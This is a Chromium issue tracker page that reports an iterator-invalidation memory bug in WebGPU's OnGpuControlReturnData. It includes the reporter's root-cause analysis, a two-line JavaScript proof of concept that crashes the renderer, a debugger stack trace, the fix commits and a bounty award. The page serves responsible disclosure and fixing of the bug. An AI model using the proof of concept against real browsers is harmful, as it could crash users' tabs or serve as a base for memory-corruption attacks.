# Security: Web GPU - Out of bound object manupilation in WebGPUImplementation::OnGpuControlReturnData()

| Field | Value |
|-------|-------|
| **Issue ID** | [40056885](https://issues.chromium.org/issues/40056885) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>WebGPU |
| **Platforms** | Mac, Windows, ChromeOS |
| **Reporter** | lo...@gmail.com |
| **Assignee** | cw...@chromium.org |
| **Created** | 2021-08-15 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**  

Specifically crafted HTML file can cause Out of bound object manupilation in Web GPU code WebGPUImplementation::OnGpuControlReturnData(). This bug may be potantially exploited to achieve one click remote code execution in renderer process.

```
WebGPUImplementation uses a flat map to maintain the mapping of request_adapter_serial and request_adapter_callback callback:  
	  
  base::flat_map<DawnRequestDeviceSerial, base::OnceCallback<void(bool)>>  
	  request_device_callback_map_;  

When navigator.gpu.requestAdapter() is called in JS,  WebGPUImplementation::RequestAdapterAsync() increases request_adapter_serial by one and addes one entry to request_adapter_callback_map_ and sends out the actual GPU adapter request:  

	void WebGPUImplementation::RequestAdapterAsync()  
	{  
	  ...  
	  DawnRequestAdapterSerial request_adapter_serial = NextRequestAdapterSerial();  
	  ...  
	  request_adapter_callback_map_[request_adapter_serial] =  
		  std::move(request_adapter_callback);  
	  helper_->RequestAdapter(request_adapter_serial,  
							  static_cast<uint32_t>(power_preference));  
	  ...  
	}  

When data returns, the request_adapter_callback is looked up by the request_adapter_serial. The corresponding request_adapter_callback gets executed and then it get erased from the request_adapter_callback_map_:  

	void WebGPUImplementation::OnGpuControlReturnData()  
		  ...  
		  DawnRequestAdapterSerial request_adapter_serial =  
			  returned_adapter_info->header.request_adapter_serial;  
		  auto request_callback_iter =  
			  request_adapter_callback_map_.find(request_adapter_serial);  
		  ...  
		  std::move(request_callback)  
			  .Run(adapter_service_id, adapter_properties, error_message);  
		  request_adapter_callback_map_.erase(request_callback_iter);  

If a customed then getter is defined in JS:  

	Object.prototype.__defineGetter__("then", function() { navigator.gpu.requestAdapter();});  

The customed getter code would be executed in the same context of that request_adapter_callback.  
If a requestAdapter() JS statement is put in the customed getter, it would cause the size change (from 1 to 2) of the request_adapter_callback_map_ as stated above. This mutation happens before the return of the first request_adapter_callback ( "std::move(request_callback).Run(adapter_service_id, adapter_properties, error_message)" ).  

Because the flat_map request_adapter_callback_map_ is actually vector behind the scence:  

	template <class Key,  
			  class Mapped,  
			  class Compare = std::less<>,  
			  class Container = std::vector<std::pair<Key, Mapped>>>  
	class flat_map : public ::base::internal::  
						 flat_tree<Key, internal::GetFirst, Compare, Container> {	  
					   
The mutation of request_adapter_callback_map_ invalidates request_callback_iter before Run() returns.   
Therefore, after Run() returns, what the iterator (request_callback_iter) points to, no longer belongs to the container. Further operations against it actually manipulates on a out of bound non existing object.  
  
An ASAN report is also attached for your easy asessment.  

```

**VERSION**  

Google Chrome 94.0.4603.0 (Official Build) dev (64-bit) (cohort: Dev)  

Revision 937de3c41c6f97659ce98d7afdff3e6722f2b6cc-refs/branch-heads/4603@{#1}  

OS Windows 10 OS Version 2009 (Build 19043.1110)  

JavaScript V8 9.4.125

**REPRODUCTION CASE** ( OOB\_OnGpuControlReturnData\_PoC.html )  

<script>  

Object.prototype.**defineGetter**("then", function() { navigator.gpu.requestAdapter();});  

navigator.gpu.requestAdapter();  

</script>

STEPS TO REPRODUCE  

1) Run Chrome with option " --enable-features=WebGPUService --enable-blink-features=WebGPU ".(It does not need any command line option in production because the WebGPU feature is in origin trial)  

2) Open the PoC ( OOB\_OnGpuControlReturnData\_PoC.html ) in Chrome.  

3) Chrome crashes in in WebGPUImplementation::OnGpuControlReturnData().

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State:

```
(1f28.202c): Access violation - code c0000005 (!!! second chance !!!)  
chrome!std::__1::__cxx_atomic_fetch_sub [inlined in chrome!base::internal::CallbackBase::operator=+0x26]:  
00007ffe`68e05fb6 f0ff09          lock dec dword ptr [rcx] ds:2fed52ff`91d8ffff=????????  
6:031> r  
rax=af0c61ff91d8ffff rbx=0000276e009ef360 rcx=2fed52ff91d8ffff  
rdx=0000276e009ef368 rsi=0000276e009ef358 rdi=0000000000000000  
rip=00007ffe68e05fb6 rsp=000000fb76dfdf50 rbp=0000276e00b3ef20  
 r8=0000000000000000  r9=0000276e008f4148 r10=0000276e0080f6d0  
r11=000000000000008c r12=aaaaaaaaaaaaaaaa r13=aaaaaaaaaaaaaaaa  
r14=0000276e00268750 r15=0000000000000000  
iopl=0         nv up ei pl nz na po nc  
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010204  
chrome!std::__1::__cxx_atomic_fetch_sub [inlined in chrome!base::internal::CallbackBase::operator=+0x26]:  
00007ffe`68e05fb6 f0ff09          lock dec dword ptr [rcx] ds:2fed52ff`91d8ffff=????????  
6:031> dv  
			__a = 0x2fed52ff`91d8ffff  
		__delta = <value unavailable>  
		__order = <value unavailable>  
6:031> k  
 # Child-SP          RetAddr           Call Site  
00 (Inline Function) --------`-------- chrome!std::__1::__cxx_atomic_fetch_sub [C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\atomic @ 1072]   
01 (Inline Function) --------`-------- chrome!std::__1::__atomic_base<int,1>::fetch_sub [C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\atomic @ 1719]   
02 (Inline Function) --------`-------- chrome!base::AtomicRefCount::Decrement [C:\b\s\w\ir\cache\builder\src\base\atomic_ref_count.h @ 39]   
03 (Inline Function) --------`-------- chrome!base::subtle::RefCountedThreadSafeBase::ReleaseImpl [C:\b\s\w\ir\cache\builder\src\base\memory\ref_counted.h @ 219]   
04 (Inline Function) --------`-------- chrome!base::subtle::RefCountedThreadSafeBase::Release [C:\b\s\w\ir\cache\builder\src\base\memory\ref_counted.h @ 171]   
05 (Inline Function) --------`-------- chrome!base::RefCountedThreadSafe<base::internal::BindStateBase,base::internal::BindStateBaseRefCountTraits>::Release [C:\b\s\w\ir\cache\builder\src\base\memory\ref_counted.h @ 399]   
06 (Inline Function) --------`-------- chrome!scoped_refptr<base::internal::BindStateBase>::Release [C:\b\s\w\ir\cache\builder\src\base\memory\scoped_refptr.h @ 322]   
07 (Inline Function) --------`-------- chrome!scoped_refptr<base::internal::BindStateBase>::~scoped_refptr+0xe [C:\b\s\w\ir\cache\builder\src\base\memory\scoped_refptr.h @ 224]   
08 (Inline Function) --------`-------- chrome!scoped_refptr<base::internal::BindStateBase>::operator=+0x14 [C:\b\s\w\ir\cache\builder\src\base\memory\scoped_refptr.h @ 250]   
09 000000fb`76dfdf50 00007ffe`67a0bb09 chrome!base::internal::CallbackBase::operator=+0x26 [C:\b\s\w\ir\cache\builder\src\base\callback_internal.cc @ 48]   
0a (Inline Function) --------`-------- chrome!base::OnceCallback<void (int, const WGPUDeviceProperties &, const char \*)>::operator=+0xd [C:\b\s\w\ir\cache\builder\src\base\callback.h @ 73]   
0b (Inline Function) --------`-------- chrome!std::__1::pair<unsigned long long,base::OnceCallback<void (int, const WGPUDeviceProperties &, const char \*)> >::operator=+0x1b [C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\utility @ 630]   
0c (Inline Function) --------`-------- chrome!std::__1::__move_constexpr+0x3c [C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\algorithm @ 1876]   
0d (Inline Function) --------`-------- chrome!std::__1::__move+0x3c [C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\algorithm @ 1885]   
0e (Inline Function) --------`-------- chrome!std::__1::move+0x3c [C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\algorithm @ 1912]   
0f (Inline Function) --------`-------- chrome!std::__1::vector<std::__1::pair<unsigned long long,base::OnceCallback<void (int, const WGPUDeviceProperties &, const char \*)> >,std::__1::allocator<std::__1::pair<unsigned long long,base::OnceCallback<void (int, const WGPUDeviceProperties &, const char \*)> > > >::erase+0x3c [C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\vector @ 1719]   
10 (Inline Function) --------`-------- chrome!base::internal::flat_tree<unsigned long long,base::internal::GetFirst,std::__1::less<void>,std::__1::vector<std::__1::pair<unsigned long long,base::OnceCallback<void (int, const WGPUDeviceProperties &, const char \*)> >,std::__1::allocator<std::__1::pair<unsigned long long,base::OnceCallback<void (int, const WGPUDeviceProperties &, const char \*)> > > > >::erase+0x4c [C:\b\s\w\ir\cache\builder\src\base\containers\flat_tree.h @ 880]   
11 000000fb`76dfdf80 00007ffe`6d5ae44b chrome!gpu::webgpu::WebGPUImplementation::OnGpuControlReturnData+0x419 [C:\b\s\w\ir\cache\builder\src\gpu\command_buffer\client\webgpu_implementation.cc @ 421]   
12 000000fb`76dfe0a0 00007ffe`658419fe chrome!gpu::CommandBufferProxyImpl::OnReturnData+0x3b [C:\b\s\w\ir\cache\builder\src\gpu\ipc\client\command_buffer_proxy_impl.cc @ 617]   
13 000000fb`76dfe0e0 00007ffe`68faa71b chrome!gpu::mojom::CommandBufferClientStubDispatch::Accept+0x52e [C:\b\s\w\ir\cache\builder\src\out\Release_x64\gen\gpu\ipc\common\gpu_channel.mojom.cc @ 6472]   
14 (Inline Function) --------`-------- chrome!mojo::InterfaceEndpointClient::HandleValidatedMessage+0x462 [C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\interface_endpoint_client.cc @ 898]   
15 000000fb`76dfe220 00007ffe`68efd319 chrome!mojo::InterfaceEndpointClient::HandleIncomingMessageThunk::Accept+0x48b [C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\interface_endpoint_client.cc @ 329]   
16 000000fb`76dfe310 00007ffe`6961b203 chrome!mojo::MessageDispatcher::Accept+0x69 [C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\message_dispatcher.cc @ 43]   
17 (Inline Function) --------`-------- chrome!mojo::InterfaceEndpointClient::HandleIncomingMessage+0x23 [C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\interface_endpoint_client.cc @ 655]   
18 (Inline Function) --------`-------- chrome!IPC::`anonymous namespace'::ChannelAssociatedGroupController::AcceptOnEndpointThread+0xec [C:\b\s\w\ir\cache\builder\src\ipc\ipc_mojo_bootstrap.cc @ 981]   
19 (Inline Function) --------`-------- chrome!base::internal::FunctorTraits<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::\*)(mojo::Message),void>::Invoke+0x1a2 [C:\b\s\w\ir\cache\builder\src\base\bind_internal.h @ 509]   
1a (Inline Function) --------`-------- chrome!base::internal::InvokeHelper<0,void>::MakeItSo+0x1aa [C:\b\s\w\ir\cache\builder\src\base\bind_internal.h @ 648]   
1b (Inline Function) --------`-------- chrome!base::internal::Invoker<base::internal::BindState<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::\*)(mojo::Message),scoped_refptr<IPC::(anonymous namespace)::ChannelAssociatedGroupController>,mojo::Message>,void ()>::RunImpl+0x1ae [C:\b\s\w\ir\cache\builder\src\base\bind_internal.h @ 721]   
1c 000000fb`76dfe390 00007ffe`64bb54b4 chrome!base::internal::Invoker<base::internal::BindState<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::\*)(mojo::Message),scoped_refptr<IPC::(anonymous namespace)::ChannelAssociatedGroupController>,mojo::Message>,void ()>::RunOnce+0x1d3 [C:\b\s\w\ir\cache\builder\src\base\bind_internal.h @ 690]   
1d (Inline Function) --------`-------- chrome!base::OnceCallback<void ()>::Run+0x16 [C:\b\s\w\ir\cache\builder\src\base\callback.h @ 98]   
1e 000000fb`76dfe610 00007ffe`68e685e7 chrome!base::TaskAnnotator::RunTask+0x1a4 [C:\b\s\w\ir\cache\builder\src\base\task\common\task_annotator.cc @ 178]   
1f (Inline Function) --------`-------- chrome!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl+0xf6 [C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 360]   
20 000000fb`76dfe760 00007ffe`6698f6c9 chrome!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork+0x187 [C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 260]   
21 000000fb`76dfeaf0 00007ffe`653c9223 chrome!base::MessagePumpDefault::Run+0x99 [C:\b\s\w\ir\cache\builder\src\base\message_loop\message_pump_default.cc @ 41]   
22 000000fb`76dfeba0 00007ffe`65587c86 chrome!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run+0x83 [C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 470]   
23 000000fb`76dfec10 00007ffe`65893437 chrome!base::RunLoop::Run+0x1a6 [C:\b\s\w\ir\cache\builder\src\base\run_loop.cc @ 136]   
24 000000fb`76dfed20 00007ffe`67b329f0 chrome!content::RendererMain+0x2c7 [C:\b\s\w\ir\cache\builder\src\content\renderer\renderer_main.cc @ 266]   
25 (Inline Function) --------`-------- chrome!content::RunOtherNamedProcessTypeMain+0xbd [C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc @ 637]   
26 000000fb`76dfeed0 00007ffe`667bff53 chrome!content::ContentMainRunnerImpl::Run+0x1c0 [C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc @ 974]   
27 (Inline Function) --------`-------- chrome!content::RunContentProcess+0x3e [C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc @ 390]   
28 000000fb`76dfefa0 00007ffe`675835b2 chrome!content::ContentMain+0x73 [C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc @ 418]   
29 000000fb`76dff190 00007ff6`04e9f3b0 chrome!ChromeMain+0x1a2 [C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_main.cc @ 175]   
2a 000000fb`76dff2a0 00007ff6`04e9ef4f chrome_exe!MainDllLoader::Launch+0x300 [C:\b\s\w\ir\cache\builder\src\chrome\app\main_dll_loader_win.cc @ 169]   
2b 000000fb`76dff520 00007ff6`04f04872 chrome_exe!wWinMain+0xcaf [C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_exe_main_win.cc @ 382]   
2c (Inline Function) --------`-------- chrome_exe!invoke_main+0x21 [d:\A01\_work\6\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 118]   
2d 000000fb`76dff950 00007ffe`d0fc7034 chrome_exe!__scrt_common_main_seh+0x106 [d:\A01\_work\6\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 288]   
2e 000000fb`76dff990 00007ffe`d1a42651 KERNEL32!BaseThreadInitThunk+0x14  
2f 000000fb`76dff9c0 00000000`00000000 ntdll!RtlUserThreadStart+0x21  

```

## Attachments

- [OOB_OnGpuControlReturnData_PoC.html](attachments/OOB_OnGpuControlReturnData_PoC.html) (text/plain, 143 B)
- [OOB_OnGpuControlReturnData_ASAN.txt](attachments/OOB_OnGpuControlReturnData_ASAN.txt) (text/plain, 10.9 KB)

## Timeline

### [Deleted User] (2021-08-15)

[Empty comment from Monorail migration]

### cl...@chromium.org (2021-08-16)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5745460705558528.

### lo...@gmail.com (2021-08-19)

May I ask if there is anyone looking at this bug?

### cl...@chromium.org (2021-08-20)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6411370588078080.

### pa...@chromium.org (2021-08-20)

cwallez, could you please take a look? The first ClusterFuzz round couldn't reproduce it, but I tried again on a Windows bot this time. Thanks!

[Monorail components: Blink>WebGPU]

### cw...@chromium.org (2021-08-20)

Thank you for the report! This looks like a real issue of vector iterator invalidation but due to the class of issue it will depend on the internals of how the vector gets resized. The fix should be simple but not making a consistent repro case.

### [Deleted User] (2021-08-20)

[Empty comment from Monorail migration]

### ka...@chromium.org (2021-08-21)

Assigning OSes based on which OSes will have webgpu in M94.

I'm not precisely sure of the severity, but assigning one tentatively.

### [Deleted User] (2021-08-21)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### gi...@appspot.gserviceaccount.com (2021-08-25)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/653491a6e716f7937c4e80e4d008bb97a76441f5

commit 653491a6e716f7937c4e80e4d008bb97a76441f5
Author: Corentin Wallez <cwallez@chromium.org>
Date: Wed Aug 25 13:51:26 2021

WebGPU: Fix use after iterator invalidation in requestAdapter

Also adds a regression test.

Bug: chromium:1239910
Change-Id: I9f5a73493accf12f432bd4c0c32eba00203b5632
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3113023
Auto-Submit: Corentin Wallez <cwallez@chromium.org>
Commit-Queue: Corentin Wallez <cwallez@chromium.org>
Reviewed-by: Austin Eng <enga@chromium.org>
Cr-Commit-Position: refs/heads/main@{#915170}

[modify] https://crrev.com/653491a6e716f7937c4e80e4d008bb97a76441f5/gpu/command_buffer/client/webgpu_implementation.cc
[modify] https://crrev.com/653491a6e716f7937c4e80e4d008bb97a76441f5/gpu/command_buffer/client/webgpu_implementation.h
[add] https://crrev.com/653491a6e716f7937c4e80e4d008bb97a76441f5/third_party/blink/web_tests/regress/regress-1239910-adapter.html
[add] https://crrev.com/653491a6e716f7937c4e80e4d008bb97a76441f5/third_party/blink/web_tests/regress/regress-1239910-device.html


### cw...@chromium.org (2021-08-25)

[Empty comment from Monorail migration]

### am...@chromium.org (2021-08-25)

hi cwallez@, for security bugs you don't have to request merges reviews. Once you update the issue as Fixed, sheriffbot will kick in with appropriate merge review process and labeling. Thanks! 

### cw...@chromium.org (2021-08-26)

Thanks for the explanation! I'll do that.

### [Deleted User] (2021-08-26)

Your change meets the bar and is auto-approved for M94. Please go ahead and merge the CL to branch 4606 (refs/branch-heads/4606) manually. Please contact milestone owner if you have questions.
Merge instructions: https://www.chromium.org/developers/how-tos/drover
Owners: govind@(Android), harrysouders@(iOS), matthewjoseph@(ChromeOS), srinivassista@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2021-08-26)

[Empty comment from Monorail migration]

### [Deleted User] (2021-08-26)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2021-08-26)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/42fcfdb4fccd94eaad495541120a659c5e4169bc

commit 42fcfdb4fccd94eaad495541120a659c5e4169bc
Author: Corentin Wallez <cwallez@chromium.org>
Date: Thu Aug 26 19:02:20 2021

WebGPU: Fix use after iterator invalidation in requestAdapter

Also adds a regression test.

(cherry picked from commit 653491a6e716f7937c4e80e4d008bb97a76441f5)

Bug: chromium:1239910
Change-Id: I9f5a73493accf12f432bd4c0c32eba00203b5632
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3113023
Auto-Submit: Corentin Wallez <cwallez@chromium.org>
Commit-Queue: Corentin Wallez <cwallez@chromium.org>
Reviewed-by: Austin Eng <enga@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#915170}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3122327
Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
Cr-Commit-Position: refs/branch-heads/4606@{#369}
Cr-Branched-From: 35b0d5a9dc8362adfd44e2614f0d5b7402ef63d0-refs/heads/master@{#911515}

[modify] https://crrev.com/42fcfdb4fccd94eaad495541120a659c5e4169bc/gpu/command_buffer/client/webgpu_implementation.cc
[modify] https://crrev.com/42fcfdb4fccd94eaad495541120a659c5e4169bc/gpu/command_buffer/client/webgpu_implementation.h
[add] https://crrev.com/42fcfdb4fccd94eaad495541120a659c5e4169bc/third_party/blink/web_tests/regress/regress-1239910-adapter.html
[add] https://crrev.com/42fcfdb4fccd94eaad495541120a659c5e4169bc/third_party/blink/web_tests/regress/regress-1239910-device.html


### am...@google.com (2021-09-01)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2021-09-01)

Congratulations! The VRP Panel has decided to award you $7500 for this report. Nice finding and thank you for this report! 

### am...@google.com (2021-09-02)

[Empty comment from Monorail migration]

### vo...@google.com (2021-10-25)

[Empty comment from Monorail migration]

### vo...@google.com (2021-10-25)

Marking as not applicable for M90-LTS since WebGPU was only enabled in M94.

### [Deleted User] (2021-12-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1239910?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40056885)*
